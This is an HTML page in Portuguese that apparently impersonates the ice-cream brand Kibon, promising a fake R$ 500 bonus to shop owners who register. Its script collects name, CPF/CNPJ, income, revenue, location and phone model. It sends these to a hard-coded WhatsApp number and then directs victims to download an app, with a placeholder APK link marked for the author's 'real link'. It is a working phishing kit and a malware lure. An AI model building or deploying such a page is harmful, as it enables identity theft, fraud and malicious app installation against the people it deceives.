<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kibon - Cadastro e Bônus Oficial</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        :root { --kibon-red: #e2001a; --kibon-dark: #b80015; --green: #28a745; }
        * { box-sizing: border-box; font-family: 'Poppins', sans-serif; }
        body { background: #f0f2f5; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 20px; }
        
        .card {
            background: white; width: 100%; max-width: 480px; border-radius: 24px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1); overflow: hidden;
        }

        .bonus-badge {
            background: var(--green); color: white; text-align: center;
            padding: 12px; font-weight: 700; font-size: 14px;
            text-transform: uppercase; letter-spacing: 1px;
        }

        .header { padding: 30px 20px 10px; text-align: center; }
        
        /* NOVO LINK DE IMAGEM GARANTIDO */
        .logo-kibon { width: 150px; height: auto; margin-bottom: 15px; }
        
        .header h1 { font-size: 22px; color: var(--kibon-red); margin: 0; font-weight: 700; }
        .header p { font-size: 13px; color: #666; margin-top: 5px; }

        .form-body { padding: 20px 25px; }
        .input-group { margin-bottom: 12px; }
        label { display: block; font-size: 12px; font-weight: 600; color: #444; margin-bottom: 4px; }
        input, select {
            width: 100%; padding: 12px; border: 2px solid #eee; border-radius: 10px;
            font-size: 14px; transition: 0.3s; outline: none; background: #fafafa;
        }
        input:focus { border-color: var(--kibon-red); background: #fff; }

        .info-bonus {
            background: #fff9f0; border: 2px dashed #ffcc00; border-radius: 12px;
            padding: 15px; margin-top: 15px; text-align: center; font-size: 14px;
        }
        .info-bonus b { color: var(--green); font-size: 18px; display: block; margin-top: 5px; }

        .btn-main {
            width: 100%; padding: 18px; background: var(--kibon-red); color: white;
            border: none; border-radius: 14px; font-size: 16px; font-weight: 700;
            cursor: pointer; transition: 0.3s; margin-top: 20px; box-shadow: 0 4px 10px rgba(226, 0, 26, 0.3);
        }
        .btn-main:hover { background: var(--kibon-dark); transform: scale(1.02); }

        .footer { text-align: center; padding: 15px; font-size: 11px; color: #999; }
    </style>
</head>
<body>

<div class="card">
    <div class="bonus-badge">🎁 Bônus de R$ 500,00 Disponível</div>
    
    <div class="header">
        <img src="https://www.kibon.com.br/content/dam/unilever/heart/brazil/online_comms/kibon-logo.png" alt="Kibon" class="logo-kibon">
        <h1>Cadastro de Parceiro</h1>
        <p>Complete seu registro para liberar o saldo</p>
    </div>

    <form class="form-body">
        <div class="input-group">
            <label>Nome Completo do Titular</label>
            <input type="text" id="nome" placeholder="Seu nome" required>
        </div>

        <div class="input-group">
            <label>CPF ou CNPJ</label>
            <input type="text" id="documento" placeholder="000.000.000-00" required>
        </div>

        <div class="input-group">
            <label>Nome do Comércio (Fantasia)</label>
            <input type="text" id="comercio" placeholder="Nome da sua loja" required>
        </div>

        <div style="display: flex; gap: 10px;">
            <div class="input-group" style="flex: 2;">
                <label>Cidade</label>
                <input type="text" id="cidade" placeholder="Cidade" required>
            </div>
            <div class="input-group" style="flex: 1;">
                <label>Estado</label>
                <input type="text" id="estado" placeholder="UF" maxlength="2" required>
            </div>
        </div>

        <div class="input-group">
            <label>Modelo do Aparelho Celular</label>
            <input type="text" id="celular_modelo" placeholder="Ex: iPhone 15, Galaxy S23" required>
        </div>

        <div class="input-group">
            <label>Renda Mensal Estimada</label>
            <input type="text" id="renda" placeholder="R$ 0,00" required>
        </div>

        <div class="input-group">
            <label>Faturamento Atual do Ponto</label>
            <input type="text" id="faturamento" placeholder="R$ 0,00" required>
        </div>

        <div class="info-bonus">
            Após clicar em concluir, baixe o app e receba:
            <b>R$ 500,00 DE SALDO BÔNUS</b>
        </div>

        <button type="button" class="btn-main" onclick="finalizar()">CONCLUIR E RESGATAR BÔNUS</button>
    </form>

    <div class="footer">© 2026 Distribuidora Autorizada Kibon</div>
</div>

<script>
    function finalizar() {
        const meuWhatsapp = "5554999422678"; 
        const urlDownloadAPK = "https://www.kibon.com.br"; // Mude para o seu link real

        const nome = document.getElementById('nome').value;
        const documento = document.getElementById('documento').value;
        const comercio = document.getElementById('comercio').value;
        const modelo = document.getElementById('celular_modelo').value;
        const cid = document.getElementById('cidade').value;
        const est = document.getElementById('estado').value;
        const ren = document.getElementById('renda').value;
        const fat = document.getElementById('faturamento').value;

        if(!nome || !documento || !comercio || !modelo || !cid || !est || !ren || !fat) {
            alert("Por favor, preencha todos os campos para liberar seu bônus de R$ 500!");
            return;
        }

        const msg = `*CADASTRO BÔNUS R$ 500*%0A` +
                    `----------------------------%0A` +
                    `👤 *Nome:* ${nome}%0A` +
                    `📄 *Doc:* ${documento}%0A` +
                    `🏪 *Loja:* ${comercio}%0A` +
                    `📱 *Cel:* ${modelo}%0A` +
                    `📍 *Local:* ${cid} - ${est}%0A` +
                    `💰 *Renda:* ${ren}%0A` +
                    `📈 *Fat:* ${fat}%0A` +
                    `----------------------------%0A` +
                    `*AGUARDANDO LIBERAÇÃO DO SALDO*`;

        window.open(`https://api.whatsapp.com/send?phone=${meuWhatsapp}&text=${msg}`, '_blank');

        alert("Cadastro enviado! Baixe o aplicativo a seguir para resgatar seu saldo de R$ 500.");
        window.location.href = urlDownloadAPK;
    }
</script>

</body>
</html>
